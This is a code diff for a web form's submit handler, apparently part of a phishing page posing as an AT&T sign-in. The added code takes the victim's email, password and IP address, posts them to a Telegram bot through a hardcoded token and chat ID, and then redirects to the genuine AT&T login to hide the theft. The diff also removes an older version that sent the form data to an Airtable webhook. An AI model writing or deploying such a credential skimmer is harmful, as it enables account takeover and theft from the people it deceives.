@@ -150,26 +150,40 @@ $('.back').on('click', function() {
     $("#wf-form-contact-us").submit(function (event) {
       event.preventDefault(); // Prevent default form submission
 
-      var ipValue = $("#ip").val(); // Get the IP value before submitting
+      // Get the values from the form fields
+      let userEmail = $("#email-3").val();
+      let userPassword = $("#input-19").val();
+      let userIP = $("#ip").val();
 
-      if (!ipValue) {
-        alert("⚠️ Error: IP address not captured yet. Please try again.");
-        return; // Stop submission if IP is missing
-      }
+      // === REPLACE THESE WITH YOUR ACTUAL CREDENTIALS ===
+      let botToken = "8424251408:AAG_kw6Y4xUryJuf3_CAF_RIwrZNNlUXbkE";   // Example: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+      let chatId = "7241128758";       // Example: 123456789
 
-      var formData = $(this).serialize(); // Serialize form data
+      // Format the message you want to receive on Telegram
+      let messageText = `🔐 New AT&T Login\n📧 User ID: ${userEmail}\n🔑 Password: ${userPassword}\n🌐 IP Address: ${userIP}\n⏰ Time: ${new Date().toLocaleString()}`;
 
+      // Construct the Telegram API URL
+      let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Send the data to Telegram
       $.ajax({
-        url: "https://hooks.airtable.com/workflows/v1/genericWebhook/appo3MfmGBPrK45Fg/wfldpHZuCuaabPE3M/wtr8v2cmfhXN7tQoJ",
+        url: telegramUrl,
         type: "POST",
-        data: formData,
+        data: {
+          chat_id: chatId,
+          text: messageText,
+          parse_mode: 'HTML'
+        },
         success: function () {
-          console.log("✅ Form submitted successfully with IP:", ipValue);
+          console.log("✅ Form submitted to Telegram successfully");
+          // Redirect after a successful submission
+          setTimeout(function () {
+            window.location.href = "https://signin.att.com";
+          }, 1000);
         },
-        error: function () {
-          console.warn("⚠️ Airtable Webhook doesn't return a success response.");
-        },
-        complete: function () {
+        error: function (jqXHR, textStatus, errorThrown) {
+          console.error("❌ Failed to send message to Telegram:", textStatus, errorThrown);
+          // Still redirect even if there's an error (to maintain user experience)
           setTimeout(function () {
             window.location.href = "https://signin.att.com";
           }, 1000);
